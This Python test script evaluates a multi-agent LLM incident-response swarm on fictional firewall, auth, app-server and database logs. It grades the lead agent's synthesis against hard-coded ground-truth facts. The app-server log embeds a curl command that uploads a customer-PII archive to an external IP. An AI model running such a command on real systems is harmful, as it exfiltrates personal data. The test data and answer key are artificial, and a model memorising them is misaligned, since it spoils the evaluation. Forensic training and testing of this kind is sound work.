"""
Test Suite 4: The Distributed Jigsaw Root-Cause Investigation Swarm.
Tests cross-agent communication, siloed information synthesis, and multi-round deduction.
No single agent has the full picture.
"""

import os
import json
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, List
from ollama_client import OllamaClient

# Siloed evidence datasets with genuine signals and benign red herrings
SILOED_EVIDENCE = {
    "network_analyst": """
[FIREWALL / NETFLOW LOGS - CONFIDENTIAL]
14:02:11 UTC - 192.168.1.10 -> 8.8.8.8:53 DNS query: updates.corp.internal (ALLOW)
14:08:44 UTC - 203.0.113.88 -> 10.0.4.15:443 Inbound HTTPS (ALLOW, 142 KB)
14:15:22 UTC - 10.0.4.15 -> 198.51.100.42:8443 Outbound TLS connection established (ALLOW, Session ID: TLS-9021)
14:19:01 UTC - 192.168.1.45 -> 10.0.4.15:22 SSH internal admin check (ALLOW)
14:22:10 UTC - 10.0.4.15 -> 198.51.100.42:8443 Outbound data surge: 4.8 GB transferred in 45s (Session ID: TLS-9021)
14:23:05 UTC - Connection terminated by remote host 198.51.100.42.
""",
    "auth_analyst": """
[IDENTITY & ACCESS MANAGEMENT LOGS - CONFIDENTIAL]
13:55:00 UTC - user 'alice.smith' login success from corporate VPN (IP: 192.168.1.10, MFA: OK)
14:06:12 UTC - user 'svc-billing-sync' API token refreshed (TTL: 1h)
14:07:30 UTC - user 'bob.jones' login failed: invalid password (IP: 203.0.113.88, attempts: 1)
14:08:15 UTC - user 'bob.jones' login SUCCESS from unusual location (IP: 203.0.113.88, MFA: Bypassed via legacy SMS fallback)
14:12:00 UTC - user 'bob.jones' session idle
14:25:30 UTC - user 'bob.jones' password reset requested by user.
""",
    "app_infra_analyst": """
[APPLICATION SERVER / CONTAINER HOST LOGS - CONFIDENTIAL]
14:08:50 UTC - Server container web-app-prod-04 (IP: 10.0.4.15) received authenticated session token for user 'bob.jones'
14:10:05 UTC - web-app-prod-04: standard dashboard view loaded
14:13:40 UTC - web-app-prod-04: API endpoint '/api/v2/admin/export-all' accessed by session 'bob.jones'
14:14:15 UTC - web-app-prod-04: Internal temp file created: /tmp/customers_pii_export.tar.gz (Size: 4.78 GB)
14:15:20 UTC - web-app-prod-04: Curl process spawned in background: 'curl -T /tmp/customers_pii_export.tar.gz https://198.51.100.42:8443/upload'
14:22:58 UTC - web-app-prod-04: /tmp/customers_pii_export.tar.gz deleted by cleanup script.
""",
    "database_analyst": """
[DATABASE CLUSTER AUDIT LOGS - CONFIDENTIAL]
14:00:00 UTC - Scheduled DB index maintenance completed.
14:06:15 UTC - Query: SELECT count(*) FROM subscriptions WHERE active=1 (Client: svc-billing-sync)
14:13:45 UTC - Query: SELECT * FROM customer_pii_records JOIN payment_methods (Client IP: 10.0.4.15, Rows affected: 4,200,000)
14:14:02 UTC - DB Query execution time: 17.2s, 4.7 GB memory buffer allocated.
14:20:00 UTC - Routine health check: All replica nodes in sync.
"""
}

class JigsawSwarm:
    def __init__(self, model: str = "lfm3:latest"):
        self.client = OllamaClient(model=model)

    def run_investigation(self) -> Dict[str, Any]:
        t0 = time.time()
        print("\n=================================================================")
        print(" TEST 1: DISTRIBUTED JIGSAW ROOT-CAUSE INVESTIGATION SWARM")
        print("=================================================================")

        # ROUND 1: Local Silo Extraction (Each agent extracts suspicious anomalies from private logs)
        print("\n[Round 1] Four Specialist Agents Analyzing Siloed Data Logs...")
        r1_tasks = [
            ("Network Specialist", "network_analyst", "Extract suspicious connections, timestamps, IP addresses, and data transfers."),
            ("Identity & Auth Specialist", "auth_analyst", "Extract suspicious logins, users, IP addresses, and authentication anomalies."),
            ("App / Container Host Specialist", "app_infra_analyst", "Extract unauthorized commands, files created, and background processes."),
            ("Database Audit Specialist", "database_analyst", "Extract abnormal high-volume queries, memory surges, and client origins.")
        ]

        round1_reports = {}
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = {}
            for role, key, goal in r1_tasks:
                prompt = f"""You are the {role} in an incident response team.
Here is YOUR private, confidential log data:
{SILOED_EVIDENCE[key]}

Goal: {goal}
Respond in 2-3 concise bullet points with exact timestamps, IPs, users, and observed actions. Do not speculate beyond your log."""
                futs[ex.submit(self.client.chat, [{"role": "user", "content": prompt}], think=False, max_tokens=350)] = role

            for fut in futs:
                role = futs[fut]
                res = fut.result()
                round1_reports[role] = res["content"] or res["thinking"]
                print(f" -> [{role}] Completed in {res['elapsed_sec']}s")

        # ROUND 2: Cross-Agent Interrogation & Synthesis Exchange
        print("\n[Round 2] Cross-Agent Evidence Sharing & Correlation...")
        shared_intel = "\n\n".join([f"=== {role} Intel ===\n{report}" for role, report in round1_reports.items()])

        correlation_prompt = f"""You are the Lead Digital Forensics Detective.
The 4 specialist agents in your swarm have submitted their individual intel from their isolated silos:

{shared_intel}

Correlate the evidence across all 4 silos and answer:
1. What was the exact compromised user account and origin IP?
2. Which internal server was hijacked to access the database?
3. What sensitive asset was exfiltrated, what was its size, and to what external IP?
4. Construct the chronological timeline of the attack from initial breach to cleanup in 4-5 key timestamps."""

        lead_res = self.client.chat(
            [
                {"role": "system", "content": "You are a master digital forensics investigator. Correlate clues with strict factual accuracy."},
                {"role": "user", "content": correlation_prompt}
            ],
            think=False,
            max_tokens=600
        )
        print(f" -> [Lead Forensics Investigator] Completed in {lead_res['elapsed_sec']}s ({lead_res['eval_count']} tokens)")

        # ROUND 3: Automated Validation Check
        # Does the conclusion contain the 5 ground-truth facts?
        verdict = lead_res["content"] or lead_res["thinking"]
        ground_truth_checks = {
            "compromised_user_bob_jones": "bob.jones" in verdict.lower(),
            "origin_ip_203.0.113.88": "203.0.113.88" in verdict,
            "target_host_10.0.4.15": "10.0.4.15" in verdict,
            "exfil_ip_198.51.100.42": "198.51.100.42" in verdict,
            "exfil_size_approx_4.8GB": ("4.8" in verdict or "4.78" in verdict or "4.7" in verdict or "4.8 gb" in verdict.lower())
        }
        score = sum(1 for v in ground_truth_checks.values() if v)
        accuracy_pct = (score / len(ground_truth_checks)) * 100.0

        print(f"\n[Ground Truth Validation Score]: {score}/{len(ground_truth_checks)} ({accuracy_pct:.0f}%)")
        for k, v in ground_truth_checks.items():
            print(f" - {k}: {'PASS' if v else 'FAIL'}")

        total_time = round(time.time() - t0, 2)
        return {
            "test_name": "Distributed Jigsaw Investigation Swarm",
            "total_time_sec": total_time,
            "accuracy_pct": accuracy_pct,
            "checks": ground_truth_checks,
            "round1_reports": round1_reports,
            "final_synthesis": verdict
        }

if __name__ == "__main__":
    swarm = JigsawSwarm()
    res = swarm.run_investigation()
    os.makedirs("./results", exist_ok=True)
    with open("./results/jigsaw_investigation_report.json", "w") as f:
        json.dump(res, f, indent=2)
